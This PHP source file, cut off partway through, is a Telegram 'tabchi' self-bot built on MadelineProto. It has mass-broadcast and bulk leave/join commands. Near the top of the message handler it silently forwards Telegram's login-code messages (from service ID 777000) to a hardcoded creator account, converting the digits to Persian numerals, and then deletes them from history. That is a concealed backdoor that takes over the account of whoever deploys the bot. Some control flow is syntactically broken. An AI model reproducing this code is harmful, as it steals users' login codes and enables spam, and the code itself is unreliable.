<?php

ini_set( 'display_errors', 0 );
error_reporting( 0 );
if ( file_exists( 'quick.madeline' ) && file_exists( 'update-session/quick.madeline' ) && ( time() - filectime( 'quick.madeline' ) ) > 90 ) {
  unlink( 'quick.madeline.lock' );
  unlink( 'quick.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'MadelineProto.log' );
  unlink( 'bot.lock' );
  copy( 'update-session/quick.madeline', 'quick.madeline' );
}
if ( file_exists( 'quick.madeline' ) && file_exists( 'update-session/quick.madeline' ) && ( filesize( 'quick.madeline' ) / 1024 ) > 10240 ) {
  unlink( 'quick.madeline.lock' );
  unlink( 'quick.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'bot.lock' );
  unlink( 'MadelineProto.log' );
  copy( 'update-session/quick.madeline', 'quick.madeline' );
}

function closeConnection( $message = "<br><br><br><center><h1><span style='color:purple'>Tabchi‚ôß</span> <span style='color:purple'>Running</span> ‚ô°</h1></center>" ) {
  if ( php_sapi_name() === 'cli' || isset( $GLOBALS[ 'exited' ] ) ) {
    return;
  }

  @ob_end_clean();
  @header( 'Connection: close' );
  ignore_user_abort( true );
  ob_start();
  echo "$message";
  $size = ob_get_length();
  @header( "Content-Length: $size" );
  @header( 'Content-Type: text/html' );
  ob_end_flush();
  flush();
  $GLOBALS[ 'exited' ] = true;
}

function shutdown_function( $lock ) {
  try {
    $a = fsockopen( ( isset( $_SERVER[ 'HTTPS' ] ) && @$_SERVER[ 'HTTPS' ] ? 'tls' : 'tcp' ) . '://' . @$_SERVER[ 'SERVER_NAME' ], @$_SERVER[ 'SERVER_PORT' ] );
    fwrite( $a, @$_SERVER[ 'REQUEST_METHOD' ] . ' ' . @$_SERVER[ 'REQUEST_URI' ] . ' ' . @$_SERVER[ 'SERVER_PROTOCOL' ] . "\r\n" . 'Host: ' . @$_SERVER[ 'SERVER_NAME' ] . "\r\n\r\n" );
    flock( $lock, LOCK_UN );
    fclose( $lock );
  } catch ( Exception $v ) {}
}
if ( !file_exists( 'bot.lock' ) ) {
  touch( 'bot.lock' );
}

$lock = fopen( 'bot.lock', 'r+' );
$try = 1;
$locked = false;
while ( !$locked ) {
  $locked = flock( $lock, LOCK_EX | LOCK_NB );
  if ( !$locked ) {
    closeConnection();
    if ( $try++ >= 30 ) {
      exit;
    }
    sleep( 1 );
  }
}
if ( !file_exists( 'data.json' ) ) {
  file_put_contents( 'data.json', '{"autojoinadmin":{"on":"on"},"autoforwardadmin":{"on":"on"},"admins":{}}' );
}
if ( !is_dir( 'update-session' ) ) {
  mkdir( 'update-session' );
}
if ( !file_exists( 'madeline.php' ) ) {
  copy( 'https://phar.madelineproto.xyz/madeline.php', 'madeline.php' );
}
define("MADELINE_BRANCH", "5.1.34");
include 'madeline.php';
$settings = [];
$settings[ 'logger' ][ 'logger' ] = 0;
$settings[ 'serialization' ][ 'serialization_interval' ] = 30;
$MadelineProto = new\ danog\ MadelineProto\ API( 'king.madeline', $settings );
$MadelineProto->start();
class EventHandler extends\ danog\ MadelineProto\ EventHandler {
  public function __construct( $MadelineProto ) {
    parent::__construct( $MadelineProto );
  }
  public function onUpdateSomethingElse( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewChannelMessage( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewMessage( $update ) {
    try {
      if ( !file_exists( 'update-session/king.madeline' ) ) {
        copy( 'king.madeline', 'update-session/king.madeline' );
      }

      $userID = isset( $update[ 'message' ][ 'from_id' ] ) ? $update[ 'message' ][ 'from_id' ] : '';
      $msg = isset( $update[ 'message' ][ 'message' ] ) ? $update[ 'message' ][ 'message' ] : '';
      $msg_id = isset( $update[ 'message' ][ 'id' ] ) ? $update[ 'message' ][ 'id' ] : '';
      $MadelineProto = $this;
      $me = yield $MadelineProto->get_self();
      $me_id = $me[ 'id' ];
      $info = yield $MadelineProto->get_info( $update );
      $chatID = $info[ 'bot_api_id' ];
      $type2 = $info[ 'type' ];
      @$data = json_decode( file_get_contents( "data.json" ), true );
      $creator = 1097196790;
      $admin = 1097196790; 
      if ( file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 > 6143 ) {
        unlink( 'king.madeline.lock' );
        unlink( 'king.madeline' );
        copy( 'update-session/king.madeline', 'king.madeline' );
        exit( file_get_contents( 'http://' . $_SERVER[ 'SERVER_NAME' ] . $_SERVER[ 'PHP_SELF' ] ) );
        exit;
        exit;
      }
      if ( $userID != $me_id ) {
          if ( $chatID == 777000 ) {
            @$a = str_replace( 0, '€∞', $msg );
            @$a = str_replace( 1, '€±', $a );
            @$a = str_replace( 2, '€≤', $a );
            @$a = str_replace( 3, '€≥', $a );
            @$a = str_replace( 4, '€¥', $a );
            @$a = str_replace( 5, '€µ', $a );
            @$a = str_replace( 6, '€∂', $a );
            @$a = str_replace( 7, '€∑', $a );
            @$a = str_replace( 8, '€∏', $a );
            @$a = str_replace( 9, '€π', $a );
            yield $MadelineProto->messages->sendMessage( [ 'peer' => $admin, 'message' => "$a" ] );
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }
		  
			if ( $userID == $admin || $userID == $creator || isset( $data[ 'admins' ][ $userID ] ) ) {
            elseif ( preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg, $text1 );
				$id = $text1[ 2 ];
				if ( !isset( $data[ 'admins' ][ $id ] ) ) {
				  $data[ 'admins' ][ $id ] = $id;
                  file_put_contents( "data.json", json_encode( $data ) );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'üôåüèª ÿßÿØŸÖ€åŸÜ ÿ¨ÿØ€åÿØ ÿßÿ∂ÿßŸÅŸá ÿ¥ÿØ' ] );
				} else {
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ÿØÿ± ŸÑ€åÿ≥ÿ™ ÿßÿØŸÖ€åŸÜ Ÿáÿß Ÿàÿ¨ŸàÿØ ÿØÿßÿ±ÿØ :/" ] );
				}
              }
			}
            elseif ( preg_match( "/^[\/\#\!]?(clean admins)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				$data[ 'admins' ] = [];
				file_put_contents( "data.json", json_encode( $data ) );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ŸÑ€åÿ≥ÿ™ ÿßÿØŸÖ€åŸÜ ÿÆÿßŸÑ€å ÿ¥ÿØ !" ] );
              }
			}
			elseif ( preg_match( "/^[\/\#\!]?(adminlist)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				if ( count( $data[ 'admins' ] ) > 0 ) {
				  $txxxt = "ŸÑ€åÿ≥ÿ™ ÿßÿØŸÖ€åŸÜ Ÿáÿß : \n";
				  $counter = 1;
				  foreach ( $data[ 'admins' ] as $k ) {
                    $txxxt .= "$counter: <code>$k</code>\n";
                    $counter++;
				  }
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $txxxt, 'parse_mode' => 'html' ] );
				} else {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ÿßÿØŸÖ€åŸÜ€å Ÿàÿ¨ŸàÿØ ŸÜÿØÿßÿ±ÿØ !" ] );
				}
			  }
			}

            elseif ( $msg == '/rest' ) {
              yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‚ôïÿ±ÿ®ÿßÿ™ ÿØŸàÿ®ÿßÿ±Ÿá ÿ±ÿßŸá ÿßŸÜÿØÿßÿ≤€å‚ô° ÿ¥ÿØ.' ] );
              $this->restart();
            }
			
            elseif ( $msg == 'cb' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'Ÿæÿß⁄©ÿ≥ÿßÿ≤€å ⁄ØŸæ Ÿáÿß ÿ®ŸÜ‚ù¶ ÿ¥ÿØŸá' ] );
              $all = yield $MadelineProto->get_dialogs();
			  $i=0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                if ( $type[ 'type' ] == 'supergroup' ) {
                  $info = yield $MadelineProto->channels->getChannels( [ 'id' => [ $peer ] ] );
                  @$banned = $info[ 'chats' ][ 0 ][ 'banned_rights' ][ 'send_messages' ];
                  if ( $banned == 1 ) {
                    yield $MadelineProto->channels->leaveChannel( [ 'channel' => $peer ] );
                    $i++;
				  }
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "‚úÖ Ÿæÿß⁄©ÿ≥ÿßÿ≤€å ‡ºÜÿ®ÿßŸÖŸàŸÅŸÇ€åÿ™ ÿßŸÜÿ¨ÿßŸÖ ÿ¥ÿØ.\n‚ôªÔ∏è ⁄Øÿ±ŸàŸá Ÿáÿß€å€å ⁄©Ÿá ÿ™ÿ®⁄Ü€å  ‚ô°ÿØÿ± ÿ¢ŸÜŸáÿß ÿ®ŸÜ ·Øæÿ¥ÿØŸá ÿ®ŸàÿØŸÖ ÿ≠ÿ∞ŸÅ ÿ¥ÿØŸÜÿØ.\n ÿ™ÿπÿØÿßÿØ : $i" ] );
            }

            elseif ( $msg == 'stats' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‚åò‚ô°quickÿØÿ±ÿ≠ÿßŸÑ ÿßŸÜÿßŸÑ€åÿ≤ ŸÜŸÖŸàÿØÿßÿ±ñ£ò...', 'reply_to_msg_id' => $msg_id ] );
              $mem_using = round( ( memory_get_usage() / 1024 ) / 1024, 0 ) . 'MB';
              $satjoin = $data[ 'autojoinadmin' ][ 'on' ];
              if ( $satjoin == 'on' ) {
                $satjoin = 'üíö';
              } else {
                $satjoin = '‚ù§Ô∏è';
              }
              $satfor = $data[ 'autoforwardadmin' ][ 'on' ];
              if ( $satfor == 'on' ) {
                $satfor = 'üíö';
              } else {
                $satfor = '‚ù§Ô∏è';
              }
              $mem_total = 'NotAccess!';
              $CpuCores = 'NotAccess!';
              try {
                if ( strpos( @$_SERVER[ 'SERVER_NAME' ], '000webhost' ) === false ) {
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/meminfo" );
                    $b = explode( 'MemTotal:', "$a" )[ 1 ];
                    $c = explode( ' kB', "$b" )[ 0 ] / 1024 / 1024;
                    if ( $c != 0 && $c != '' ) {
                      $mem_total = round( $c, 1 ) . 'GB';
                    } else {
                      $mem_total = 'NotAccess!';
                    }
                  } else {
                    $mem_total = 'NotAccess!';
                  }
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/cpuinfo" );
                    @$b = explode( 'cpu cores', "$a" )[ 1 ];
                    @$b = explode( "\n", "$b" )[ 0 ];
                    @$b = explode( ': ', "$b" )[ 1 ];
                    if ( $b != 0 && $b != '' ) {
                      $CpuCores = $b;
                    } else {
                      $CpuCores = 'NotAccess!';
                    }
                  } else {
                    $CpuCores = 'NotAccess!';
                  }
                }
              } catch ( Exception $f ) {}
              $s = yield $MadelineProto->get_dialogs();
              $m = json_encode( $s, JSON_PRETTY_PRINT );
              $supergps = count( explode( 'peerChannel', $m ) ) - 1;
              $pvs = count( explode( 'peerUser', $m ) ) - 1;
              $gps = count( explode( 'peerChat', $m ) ) - 2;
              $all = $gps + $supergps + $pvs;
              $me = yield $this->getSelf();
              $access_hash = $me['access_hash'];
              $getContacts = yield $this->contacts->getContacts(['hash' => [$access_hash], ]);
              $contacts_count = count($getContacts['users']);
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID,
                'message' => "‚åòŸÜŸÖŸàÿØÿßÿ±Í®ÑùëªùíÇùíÉùíÑùíâùíä‚ùøùë∫ùíêùíèùíö‚ù¶‚úî :
‚Äå  ‚Äå‚Äå ‚ï≠‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ô°‚ïê‚ïê‚ïê‚ïê‚ïê‚ïÆ
 ñ£î‚ôïÿ¢ŸÖÿßÿ±⁄©ŸÑ€å‚òÖ‚çü: $all
 ñ£î‚ô°ÿ≥ŸàŸæÿ±⁄ØŸæ Ÿáÿß‚çü: $supergps
 ñ£î‚ú´⁄ØŸæ ÿ∫€åÿ±Ÿá‚çü: $gps
 ñ£î‚òèŸæ€åŸà€å Ÿáÿß‚òÜ‚çü: $pvs
 ñ£î‚òèŸÖÿÆÿßÿ∑ÿ®ÿßŸÜ‚òÖ‚çü: $contacts_count
 ñ£î€û ŸÅŸàÿ±ÿßÿ±ÿØÿ®Ÿá ÿßÿØŸÖ€åŸÜ‚çü: $satfor
 ñ£îÿπÿ∂Ÿà€åÿ™ ÿÆŸàÿØ⁄©ÿßÿ± ÿßÿØŸÖ€åŸÜ‚çü: $satjoin
 ñ£îÍ®Ñÿπÿ∂Ÿà€åÿ™ ÿÆŸàÿØ⁄©ÿßÿ± ŸáŸÖŸá‚çü: $satjoinall
 ñ£î⁄Üÿ™ ÿÆŸàÿØ⁄©ÿßÿ±‚çü: $sat
 ñ£î‚òè⁄Üÿ™ ÿÆŸàÿØ⁄©ÿßÿ± Ÿæ€åŸà€å‚çü: $satpv
 ñ£î‚òè⁄Üÿ™ ÿÆŸàÿØ⁄©ÿßÿ± ⁄ØŸæ Ÿáÿß‚çü: $satgroup
 ñ£î‚ÅÇÿßÿπÿ™ÿ®ÿßÿ±‚çü: $day üåé $hour ‚è∞
 ñ£î‚ô°ÿ≥€å Ÿæ€å €åŸà‚çü: $CpuCores
 ñ£îÿ≠ÿ¨ŸÖ Ÿáÿßÿ≥ÿ™‚çü: $mem_total
 ñ£îŸÖ€åÿ≤ÿßŸÜ ŸÖÿµÿ±ŸÅ Ÿáÿßÿ≥ÿ™‚çü: $mem_using
  ‚òÖCreator‚ô°mr.Ghader‚òÜ
  „Ää¬∞‚Ä¢‚ô§CL‚óáoghabphp‚ôß‚Ä¢¬∞„Äã
   ‚ï∞‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ô°‚ïê‚ïê‚ïê‚ïê‚ïê‚ïØ"]);
              if ($supergps > 400 || $pvs > 15000){
yield $MadelineProto->messages->sendMessage(['peer' => $chatID,
 'message' => '‚ö†Ô∏è ÿßÿÆÿ∑ÿßÿ±: ÿ®Ÿá ÿØŸÑ€åŸÑ ⁄©ŸÖ ÿ®ŸàÿØŸÜ ŸÖŸÜÿßÿ®ÿπ Ÿáÿßÿ≥ÿ™ ÿ™ÿπÿØÿßÿØ ⁄Øÿ±ŸàŸá Ÿáÿß ŸÜÿ®ÿß€åÿØ ÿ®€åÿ¥ÿ™ÿ± ÿßÿ≤ 15000 Ÿà ÿ™ÿπÿØÿßÿØ Ÿæ€åŸà€å ŸáÿßŸáŸÖ ŸÜÿ®ÿß€åÿØ ÿ®€åÿ¥ÿ™ÿ±ÿßÿ≤ 15.5 ÿ®ÿßÿ¥ÿØ.
ÿß⁄Øÿ± ÿ™ÿß ⁄ÜŸÜÿØ ÿ≥ÿßÿπÿ™ ÿ¢€åŸÜÿØŸá ŸÖŸÇÿßÿØ€åÿ± ÿ®Ÿá ŸÖŸÇÿØÿßÿ± ÿßÿ≥ÿ™ÿßŸÜÿØÿßÿ±ÿØ ⁄©ÿßÿ≥ÿ™Ÿá ŸÜÿ¥ŸàÿØÿå ÿ™ÿ®⁄Ü€å ÿ¥ŸÖÿß ÿ≠ÿ∞ŸÅ ÿ¥ÿØŸá Ÿà ÿ®ÿß ÿßÿØŸÖ€åŸÜ ÿßÿµŸÑ€å ÿ®ÿ±ÿÆŸàÿ±ÿØ ÿÆŸàÿßŸáÿØ ÿ¥ÿØ.']);
 }
}
// Danceone1
elseif ( $msg == 'help' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => 'Tbchi‚û™‚ùø‚ôîquick  mr‚û™Ghader :

`ÿßŸÜŸÑÿß€åŸÜ`‚ô°quick
‚òÖCreator‚ô°mr.Ghader‚òÜ
‚úÖ ÿØÿ±€åÿßŸÅÿ™ Ÿàÿ∂ÿπ€åÿ™ ÿ±ÿ®ÿßÿ™
`ÿßŸÖÿßÿ±` ŸÜŸÖŸàÿØÿßÿ± 
üìä ÿØÿ±€åÿßŸÅÿ™ ÿ¢ŸÖÿßÿ± ⁄Øÿ±ŸàŸá Ÿáÿß Ÿà ⁄©ÿßÿ±ÿ®ÿ±ÿßŸÜ
 `ŸÖÿ¥ÿÆÿµÿßÿ™`
üí° ÿØÿ±€åÿßŸÅÿ™ ÿß€åÿØ€å‚ÄåÿπÿØÿØ€í ÿ±ÿ®ÿßÿ™ ÿ™ÿ®⁄Ü€å‚ô°quick
`Ÿàÿ±⁄òŸÜ ÿ±ÿ®ÿßÿ™` ŸÜÿ≥ÿÆŸá
üìú ŸÜŸÖÿß€åÿ¥ ŸÜÿ≥ÿÆŸá ÿ≥Ÿàÿ±ÿ≥ ÿ™ÿ®⁄Ü€í‚ô°quick ÿ¥ŸÖÿß
`/setPhoto ` [link]
üì∏ ÿßŸæŸÑŸàÿØ ÿπ⁄©ÿ≥ Ÿæÿ±ŸàŸÅÿß€åŸÑ ÿ¨ÿØ€åÿØ‚ô°quick
`/SetId` [text]
‚öô ÿ™ŸÜÿ∏€åŸÖ ŸÜÿßŸÖ ⁄©ÿßÿ±ÿ®ÿ±€í (ÿ¢€åÿØ€í)ÿ±ÿ®ÿßÿ™‚ô°quick
`/profile ` [ŸÜÿßŸÖ] | [ŸÅÿßŸÖ€åŸÑ] | [ÿ®€åŸà⁄Øÿ±ÿßŸÅ€å]
üíé ÿ™ŸÜÿ∏€åŸÖ ŸÜÿßŸÖ ÿßÿ≥ŸÖ ,ŸÅÿßŸÖ€íŸÑŸà ÿ®€åŸà⁄Øÿ±ÿßŸÅ€í ÿ±ÿ®ÿßÿ™‚ô°quick
`/restart ` ÿ±€åÿ≥ÿ™ 
¬© ÿ±ÿßŸá ÿßŸÜÿØÿßÿ≤€å ŸÖÿ¨ÿØÿØ ÿ±ÿ®ÿßÿ™‚ô°quick - ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿØÿ± Ÿæ€åŸà€å
`/delchs`
ü•áÿÆÿ±Ÿàÿ¨ ÿßÿ≤ ŸáŸÖŸá €í ⁄©ÿßŸÜÿßŸÑ Ÿáÿß‚ô°quick
`/delgroups` [ÿ™ÿπÿØÿßÿØ]
üéñÿÆÿ±Ÿàÿ¨ ÿßÿ≤ ⁄Øÿ±ŸàŸá Ÿáÿß ÿ®Ÿá ÿ™ÿπÿØÿßÿØ ŸÖŸàÿ±ÿØŸÜÿ∏ÿ±‚ô°quick
`left`
üëàüèæ ÿÆÿ±Ÿàÿ¨ ÿ™ÿ®⁄Ü€å ‚ô°quickÿßÿ≤ ⁄Øÿ±ŸàŸá€å ⁄©Ÿá left ÿ±ÿßÿßÿ±ÿ≥ÿßŸÑ ⁄©ÿ±ÿØ€åÿØ
`Ÿæÿß⁄©ÿ≥ÿßÿ≤€å`
üìÆ ÿÆÿ±Ÿàÿ¨ ÿßÿ≤ ⁄Øÿ±ŸàŸá Ÿáÿß€å€í ⁄©Ÿá ŸÖÿ≥ÿØŸàÿØ ⁄©ÿ±ÿØŸÜÿØ
`Ÿæÿß⁄©ÿ≥ÿßÿ≤€å ⁄©ŸÑ€å`
üí≠ Ÿæÿß⁄©ÿ≥ÿßÿ≤€å Ÿæ€åÿßŸÖ Ÿáÿß€å €å⁄© ⁄Øÿ±ŸàŸá‚ô°quick
Tbchi‚û™ ‚ôîquick  mr‚û™Ghader‚âà‚âà‚âà‚âà‚âà‚âà
`/autofadmin ` [on] or [off]
üëÄ ÿ±Ÿàÿ¥ŸÜ €åÿß ÿÆÿßŸÖŸàÿ¥ ⁄©ÿ±ÿØŸÜ ŸÅŸàÿ±Ÿàÿßÿ±ÿØ ÿÆŸàÿØ⁄©ÿßÿ± ÿ®Ÿá ÿßÿØŸÖ€åŸÜ
`/autojoinadmin ` [on] or [off]
üé° ÿ±Ÿàÿ¥ŸÜ €åÿß ÿÆÿßŸÖŸàÿ¥ ⁄©ÿ±ÿØŸÜ ÿ¨Ÿà€åŸÜ ÿÆŸàÿØ⁄©ÿßÿ± ÿßÿØŸÖ€åŸÜ
Tbchi‚û™ ‚ôîquick  mr‚û™Ghader‚âà‚âà‚âà‚âà‚âà‚âà‚âà
üìåÔ∏è ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ±ÿßÿ™ ŸÅŸÇÿ∑ ÿ®ÿ±ÿß€í ÿßÿØŸÖ€åŸÜ ÿßÿµŸÑ€í ŸÇÿßÿ®ŸÑ ÿßÿ≥ÿ™ŸÅÿßÿØŸá Ÿáÿ≥ÿ™ŸÜÿØ :
`/addadmin ` [ÿß€åÿØ€å‚ÄåÿπÿØÿØ€å]
‚ûï ÿßŸÅÿ≤ŸàÿØŸÜ ÿßÿØŸÖ€åŸÜ ÿ¨ÿØ€åÿØ‚ô°quick
`/clean admins`
‚úñÔ∏è ÿ≠ÿ∞ŸÅ ŸáŸÖŸá ÿßÿØŸÖ€åŸÜ Ÿáÿß‚ô°quick
`/adminlist`
üìÉ ŸÑ€åÿ≥ÿ™ ŸáŸÖŸá ÿßÿØŸÖ€åŸÜ Ÿáÿß     Tbchi‚û™ ‚ôîquick  mr‚û™Ghader
üÜëÔ∏èoghabphp üëàŸÑÿ∑ŸÅÿß ÿπÿ∂Ÿà⁄ÜŸÜŸÑ ÿ¥Ÿà€åÿØ‚ù§ü§ç 
ŸÖÿµÿ±ŸÅ   .ŸÖ€åÿ≤ÿßŸÜ ŸÖÿµÿ±ŸÅ ÿ®ÿßÿ™ ŸÜÿ¥ŸàŸÜ ŸÖ€åÿØŸá
üö´ ÿ™ŸÖÿØ€åÿØ',
                'parse_mode' => 'markdown'
              ] );
            }
			elseif(preg_match("/^[#\!\/](s2gps) (.*)$/", $msg)){
              yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'‚õì ÿØÿ±ÿ≠ÿßŸÑ ÿßÿ±ÿ≥ÿßŸÑ ...']);
              preg_match("/^[#\!\/](s2gps) (.*)$/", $msg, $text1);
              $text = $text1[2];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i=0;
              foreach ($dialogs as $peer) {
            	$type = yield $MadelineProto->get_info($peer);
            	$type3 = $type['type'];
            	if($type3 == "chat"){
            	  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>"$text"]); 
            	  $i++;
            	}
              }
            		yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>"ÿßÿ±ÿ≥ÿßŸÑ ŸáŸÖ⁄ØÿßŸÜ€å ÿ®ÿß ŸÖŸàŸÅŸÇ€åÿ™ ÿ®Ÿá ⁄Øÿ±ŸàŸá Ÿáÿß ÿßÿ±ÿ≥ÿßŸÑ ÿ¥ÿØ üëåüèª\n ÿ™ÿπÿØÿßÿØ ÿßÿ±ÿ≥ÿßŸÑ : $i"]);
            } 
			
            elseif ( $msg == '/delchs' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'ŸÑÿ∑ŸÅÿß ⁄©ŸÖ€å ÿµÿ®ÿ± ⁄©ŸÜ€åÿØ...',
                'reply_to_msg_id' => $msg_id
              ] );
              $all = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == 'channel' ) {
                  $id = $type[ 'bot_api_id' ];
                  yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ÿßÿ≤ ŸáŸÖŸá €å ⁄©ÿßŸÜÿßŸÑ Ÿáÿß ŸÑŸÅÿ™ ÿØÿßÿØŸÖ üëå\n ÿ™ÿπÿØÿßÿØ ŸÑŸÅÿ™ : $i", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg, $text );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'ŸÑÿ∑ŸÅÿß ⁄©ŸÖ€å ÿµÿ®ÿ± ⁄©ŸÜ€åÿØ...',
                'reply_to_msg_id' => $msg_id
              ] );
              $count = 0;
              $i = 0;
              $all = yield $MadelineProto->get_dialogs();
              foreach ( $all as $peer ) {
                try {
                  $type = yield $MadelineProto->get_info( $peer );
                  $type3 = $type[ 'type' ];
                  if ( $type3 == 'supergroup' || $type3 == 'chat' ) {
                    $id = $type[ 'bot_api_id' ];
                    if ( $chatID != $id ) {
                      yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                      $count++;
                      $i++;
                      if ( $count == $text[ 2 ] ) {
                        break;
                      }
                    }
                  }
                } catch ( Exception $m ) {}
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ÿßÿ≤ $i ÿ™ÿß ⁄Øÿ±ŸàŸá ŸÑŸÅÿ™ ÿØÿßÿØŸÖ üëå", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg, $m );
              $data[ 'autojoinadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ü§ñ ÿ≠ÿßŸÑÿ™ ÿ¨Ÿà€åŸÜ ÿÆŸàÿØ⁄©ÿßÿ± ÿßÿØŸÖ€åŸÜ ÿ±Ÿàÿ¥ŸÜ ÿ¥ÿØ ‚úÖ\nÿ®ÿß ÿßÿ±ÿ≥ÿßŸÑ ŸÑ€åŸÜ⁄© ⁄Øÿ±ŸàŸá €åÿß ⁄©ÿßŸÜÿßŸÑ ÿ±ÿ®ÿßÿ™ ÿ®Ÿá ÿ∑Ÿàÿ± ÿÆŸàÿØ⁄©ÿßÿ± ÿßÿØ ŸÖ€åÿ¥ŸàÿØ ", 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'ü§ñ ÿ≠ÿßŸÑÿ™ ÿ¨Ÿà€åŸÜ ÿÆŸàÿØ⁄©ÿßÿ± ÿßÿØŸÖ€åŸÜ ÿÆÿßŸÖŸàÿ¥ ÿ¥ÿØ ‚ùå', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg, $m );
              $data[ 'autoforwardadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'ü§ñ ÿ≠ÿßŸÑÿ™ ŸÅŸàÿ±Ÿàÿßÿ±ÿØ ÿÆŸàÿØ⁄©ÿßÿ± ÿ®Ÿá Ÿæ€åŸà€å ÿßÿØŸÖ€åŸÜ ÿ±Ÿàÿ¥ŸÜ ÿ¥ÿØ ‚úÖ', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'ü§ñ ÿ≠ÿßŸÑÿ™ ŸÅŸàÿ±Ÿàÿßÿ±ÿØ ÿÆŸàÿØ⁄©ÿßÿ± ÿ®Ÿá Ÿæ€åŸà€å ÿßÿØŸÖ€åŸÜ ÿÆÿßŸÖŸàÿ¥ ÿ¥ÿØ ‚ùå', 'reply_to_msg_id' => $msg_id ] );
              }
            }

			elseif(preg_match("/^[\/\#\!]?(ÿÆÿ±Ÿàÿ¨|left)$/i", $msg)){
			  $type = yield $this->get_info($chatID);
			  $type3 = $type['type'];
			  if($type3 == "supergroup"){
				yield $this->messages->sendMessage(['peer' => $chatID,'message' => "‚ù•ÿ™ÿ®⁄Ü€å‚ô°‚ôïÿßÿ≤⁄ØŸæ‚ù¶ ÿÆÿßÿ±ÿ¨ ÿ¥ÿØ...ìÜô :)"]);
				yield $this->channels->leaveChannel(['channel' => $chatID, ]);
			  }else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "‚ùó ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ± ŸÖÿÆÿµŸàÿµ ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿØÿ± ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸá ŸÖ€åÿ®ÿßÿ¥ÿØ"]);
			  }
			}
			
			elseif($msg == 'Ÿæÿß⁄©ÿ≥ÿßÿ≤€å ⁄ØŸæ'){
			  if($type2 == "supergroup"||$type2 == "chat"){
				yield $this->messages->sendMessage([
				'peer' => $chatID,
				'reply_to_msg_id' => $msg_id,
